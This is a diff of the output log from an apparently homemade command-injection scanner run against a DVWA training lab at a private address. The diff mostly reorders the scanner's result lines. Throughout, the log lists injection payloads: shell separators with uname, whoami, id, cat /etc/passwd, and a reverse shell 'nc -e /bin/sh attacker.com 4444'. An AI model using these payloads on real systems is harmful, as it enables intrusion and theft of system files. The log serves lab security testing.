@@ -1,61 +1,3 @@
-[-] No parameters found in http://10.0.2.4/vulnerabilities/exec
-[-] No parameters found in http://10.0.2.4/security.php
-[-] No parameters found in http://10.0.2.4/vulnerabilities/xss_r
-[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=1; uname -a
-[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=1 && cat /etc/passwd
-[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=1 || ls -la
-[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=1 | whoami
-[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=$(whoami)
-[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=`id`
-[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=1 && sleep 10
-[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=1; echo Vulnerable
-[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=| nc -e /bin/sh attacker.com 4444
-[-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/sqli
-[-] No parameters found in http://10.0.2.4/vulnerabilities/upload
-[-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/xss_d
-[-] No parameters found in http://10.0.2.4/manual
-[-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/xss_s
-[-] No parameters found in http://10.0.2.4/DVWA/README.pl.md
-[-] No parameters found in http://10.0.2.4/DVWA/instructions.php
-[-] No parameters found in http://10.0.2.4/DVWA/phpinfo.php
-[-] No parameters found in http://10.0.2.4/DVWA/setup.php
-[-] No parameters found in http://10.0.2.4/vulnerabilities/xss_d
-[-] No parameters found in http://10.0.2.4/vulnerabilities/javascript
-[-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/authbypass
-[-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/exec
-[-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/csrf
-[-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/weak_id
-[-] No parameters found in http://10.0.2.4/vulnerabilities/brute
-[-] No parameters found in http://10.0.2.4/phpinfo.php
-[-] No parameters found in http://10.0.2.4/DVWA/README.id.md
-[-] No parameters found in http://10.0.2.4/DVWA/README.tr.md
-[-] No parameters found in http://10.0.2.4/DVWA/README.vi.md
-[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=1; uname -a
-[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=1 && cat /etc/passwd
-[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=1 || ls -la
-[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=1 | whoami
-[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=$(whoami)
-[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=`id`
-[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=1 && sleep 10
-[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=1; echo Vulnerable
-[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=| nc -e /bin/sh attacker.com 4444
-[-] No parameters found in http://10.0.2.4/DVWA/compose.yml
-[-] No parameters found in http://10.0.2.4/vulnerabilities/open_redirect
-[-] No parameters found in http://10.0.2.4/DVWA/README.es.md
-[-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/upload
-[-] No Command Injection at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=1; uname -a
-[-] No Command Injection at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=1 && cat /etc/passwd
-[-] No Command Injection at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=1 || ls -la
-[-] No Command Injection at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=1 | whoami
-[-] No Command Injection at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=$(whoami)
-[-] No Command Injection at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=`id`
-[-] No Command Injection at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=1 && sleep 10
-[-] No Command Injection at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=1; echo Vulnerable
-[-] No Command Injection at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=| nc -e /bin/sh attacker.com 4444
-[-] No parameters found in http://10.0.2.4/DVWA/README.ar.md
-[-] No parameters found in http://10.0.2.4/vulnerabilities/csrf
-[-] No parameters found in http://10.0.2.4/vulnerabilities/cryptography
-[-] No parameters found in http://10.0.2.4/DVWA/README.ko.md
 [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file2.php&page=1; uname -a
 [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file2.php&page=1 && cat /etc/passwd
 [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file2.php&page=1 || ls -la
@@ -65,21 +7,7 @@
 [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file2.php&page=1 && sleep 10
 [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file2.php&page=1; echo Vulnerable
 [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file2.php&page=| nc -e /bin/sh attacker.com 4444
-[-] No parameters found in http://10.0.2.4/vulnerabilities/csp
-[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=1; uname -a
-[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=1 && cat /etc/passwd
-[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=1 || ls -la
-[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=1 | whoami
-[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=$(whoami)
-[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=`id`
-[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=1 && sleep 10
-[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=1; echo Vulnerable
-[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=| nc -e /bin/sh attacker.com 4444
-[-] No parameters found in http://10.0.2.4/vulnerabilities/sqli_blind
-[-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/sqli_blind
-[-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/javascript
-[-] No parameters found in http://10.0.2.4/DVWA/security.php
-[-] No parameters found in http://10.0.2.4/DVWA/README.fa.md
+[-] No parameters found in http://10.0.2.4/vulnerabilities/upload
 [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=1&redirect=1; uname -a
 [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=1&redirect=1 && cat /etc/passwd
 [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=1&redirect=1 || ls -la
@@ -89,10 +17,27 @@
 [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=1&redirect=1 && sleep 10
 [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=1&redirect=1; echo Vulnerable
 [-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=1&redirect=| nc -e /bin/sh attacker.com 4444
-[-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/captcha
+[-] No parameters found in http://10.0.2.4/DVWA/README.ar.md
+[-] No Command Injection at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=1; uname -a
+[-] No Command Injection at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=1 && cat /etc/passwd
+[-] No Command Injection at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=1 || ls -la
+[-] No Command Injection at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=1 | whoami
+[-] No Command Injection at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=$(whoami)
+[-] No Command Injection at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=`id`
+[-] No Command Injection at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=1 && sleep 10
+[-] No Command Injection at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=1; echo Vulnerable
+[-] No Command Injection at http://10.0.2.4/vulnerabilities/fi/?page=include.php&page=| nc -e /bin/sh attacker.com 4444
+[-] No parameters found in http://10.0.2.4/vulnerabilities/sqli_blind
+[-] No parameters found in http://10.0.2.4/DVWA/setup.php
+[-] No parameters found in http://10.0.2.4/DVWA
+[-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/sqli
+[-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/xss_r
 [-] No parameters found in http://10.0.2.4/vulnerabilities/sqli
-[-] No parameters found in http://10.0.2.4/vulnerabilities/weak_id
-[-] No parameters found in http://10.0.2.4/vulnerabilities/xss_s
+[-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/exec
+[-] No parameters found in http://10.0.2.4/vulnerabilities/xss_d
+[-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/open_redirect
+[-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/upload
+[-] No parameters found in http://10.0.2.4/vulnerabilities/cryptography
 [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=changelog&doc=1; uname -a
 [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=changelog&doc=1 && cat /etc/passwd
 [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=changelog&doc=1 || ls -la
@@ -102,51 +47,7 @@
 [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=changelog&doc=1 && sleep 10
 [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=changelog&doc=1; echo Vulnerable
 [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=changelog&doc=| nc -e /bin/sh attacker.com 4444
-[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=1; uname -a
-[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=1 && cat /etc/passwd
-[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=1 || ls -la
-[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=1 | whoami
-[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=$(whoami)
-[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=`id`
-[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=1 && sleep 10
-[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=1; echo Vulnerable
-[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=| nc -e /bin/sh attacker.com 4444
-[-] No parameters found in http://10.0.2.4/DVWA
-[-] No parameters found in http://10.0.2.4/about.php
-[-] No parameters found in http://10.0.2.4/DVWA/README.pt.md
-[-] No parameters found in http://10.0.2.4/setup.php
-[-] No parameters found in http://10.0.2.4/vulnerabilities/authbypass
-[-] No parameters found in http://10.0.2.4/vulnerabilities/captcha
-[-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/xss_r
-[-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/brute
-[-] No parameters found in http://10.0.2.4/DVWA/README.fr.md
-[-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/open_redirect
-[-] No parameters found in http://10.0.2.4/DVWA/config/config.inc.php.dist
-[-] No parameters found in http://10.0.2.4/DVWA/README.zh.md
-[-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/cryptography
-[-] No parameters found in http://10.0.2.4
-[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=1; uname -a
-[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=1 && cat /etc/passwd
-[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=1 || ls -la
-[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=1 | whoami
-[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=$(whoami)
-[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=`id`
-[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=1 && sleep 10
-[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=1; echo Vulnerable
-[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=| nc -e /bin/sh attacker.com 4444
-[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=1; uname -a
-[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=1 && cat /etc/passwd
-[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=1 || ls -la
-[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=1 | whoami
-[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=$(whoami)
-[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=`id`
-[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=1 && sleep 10
-[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=1; echo Vulnerable
-[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=| nc -e /bin/sh attacker.com 4444
-[-] No parameters found in http://10.0.2.4/DVWA/docs/DVWA_v1.3.pdf
-[-] No parameters found in http://10.0.2.4/instructions.php
-[-] No parameters found in http://10.0.2.4/DVWA/about.php
-[-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/csp
+[-] No parameters found in http://10.0.2.4/DVWA/phpinfo.php
 [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=PDF&doc=1; uname -a
 [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=PDF&doc=1 && cat /etc/passwd
 [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=PDF&doc=1 || ls -la
@@ -156,3 +57,102 @@
 [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=PDF&doc=1 && sleep 10
 [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=PDF&doc=1; echo Vulnerable
 [+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=PDF&doc=| nc -e /bin/sh attacker.com 4444
+[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=1; uname -a
+[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=1 && cat /etc/passwd
+[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=1 || ls -la
+[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=1 | whoami
+[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=$(whoami)
+[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=`id`
+[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=1 && sleep 10
+[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=1; echo Vulnerable
+[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=include.php&page=| nc -e /bin/sh attacker.com 4444
+[-] No parameters found in http://10.0.2.4/vulnerabilities/brute
+[-] No parameters found in http://10.0.2.4/phpinfo.php
+[-] No parameters found in http://10.0.2.4/vulnerabilities/captcha
+[-] No parameters found in http://10.0.2.4/vulnerabilities/authbypass
+[-] No parameters found in http://10.0.2.4/DVWA/README.ko.md
+[-] No parameters found in http://10.0.2.4/DVWA/about.php
+[-] No parameters found in http://10.0.2.4/DVWA/README.pl.md
+[-] No parameters found in http://10.0.2.4/DVWA/README.fa.md
+[-] No parameters found in http://10.0.2.4/vulnerabilities/open_redirect
+[-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/xss_s
+[-] No parameters found in http://10.0.2.4/vulnerabilities/csp
+[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=1; uname -a
+[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=1 && cat /etc/passwd
+[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=1 || ls -la
+[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=1 | whoami
+[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=$(whoami)
+[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=`id`
+[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=1 && sleep 10
+[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=1; echo Vulnerable
+[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=copying&doc=| nc -e /bin/sh attacker.com 4444
+[-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/weak_id
+[-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/brute
+[-] No parameters found in http://10.0.2.4/DVWA/compose.yml
+[-] No parameters found in http://10.0.2.4/DVWA/README.vi.md
+[-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/javascript
+[-] No parameters found in http://10.0.2.4/DVWA/README.es.md
+[-] No parameters found in http://10.0.2.4
+[-] No parameters found in http://10.0.2.4/DVWA/README.tr.md
+[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=1; uname -a
+[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=1 && cat /etc/passwd
+[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=1 || ls -la
+[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=1 | whoami
+[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=$(whoami)
+[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=`id`
+[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=1 && sleep 10
+[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=1; echo Vulnerable
+[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/instructions.php?doc=readme&doc=| nc -e /bin/sh attacker.com 4444
+[-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/captcha
+[-] No parameters found in http://10.0.2.4/DVWA/README.zh.md
+[-] No parameters found in http://10.0.2.4/setup.php
+[-] No parameters found in http://10.0.2.4/vulnerabilities/javascript
+[-] No parameters found in http://10.0.2.4/DVWA/docs/DVWA_v1.3.pdf
+[-] No parameters found in http://10.0.2.4/security.php
+[-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/authbypass
+[-] No parameters found in http://10.0.2.4/manual
+[-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/cryptography
+[-] No parameters found in http://10.0.2.4/vulnerabilities/xss_r
+[-] No parameters found in http://10.0.2.4/DVWA/README.id.md
+[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=1; uname -a
+[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=1 && cat /etc/passwd
+[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=1 || ls -la
+[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=1 | whoami
+[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=$(whoami)
+[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=`id`
+[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=1 && sleep 10
+[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=1; echo Vulnerable
+[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file1.php&page=| nc -e /bin/sh attacker.com 4444
+[-] No parameters found in http://10.0.2.4/vulnerabilities/csrf
+[-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/csrf
+[-] No parameters found in http://10.0.2.4/about.php
+[-] No parameters found in http://10.0.2.4/DVWA/README.pt.md
+[-] No parameters found in http://10.0.2.4/vulnerabilities/weak_id
+[-] No parameters found in http://10.0.2.4/DVWA/config/config.inc.php.dist
+[-] No parameters found in http://10.0.2.4/vulnerabilities/exec
+[-] No parameters found in http://10.0.2.4/DVWA/README.fr.md
+[-] No parameters found in http://10.0.2.4/DVWA/instructions.php
+[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=1; uname -a
+[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=1 && cat /etc/passwd
+[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=1 || ls -la
+[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=1 | whoami
+[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=$(whoami)
+[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=`id`
+[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=1 && sleep 10
+[+] Command Injection vulnerability found at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=1; echo Vulnerable
+[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/fi/?page=file3.php&page=| nc -e /bin/sh attacker.com 4444
+[-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/csp
+[-] No parameters found in http://10.0.2.4/instructions.php
+[-] No parameters found in http://10.0.2.4/vulnerabilities/xss_s
+[-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/xss_d
+[-] No parameters found in http://10.0.2.4/DVWA/vulnerabilities/sqli_blind
+[-] No parameters found in http://10.0.2.4/DVWA/security.php
+[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=1; uname -a
+[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=1 && cat /etc/passwd
+[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=1 || ls -la
+[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=1 | whoami
+[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=$(whoami)
+[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=`id`
+[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=1 && sleep 10
+[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=1; echo Vulnerable
+[-] No Command Injection at http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2&redirect=| nc -e /bin/sh attacker.com 4444
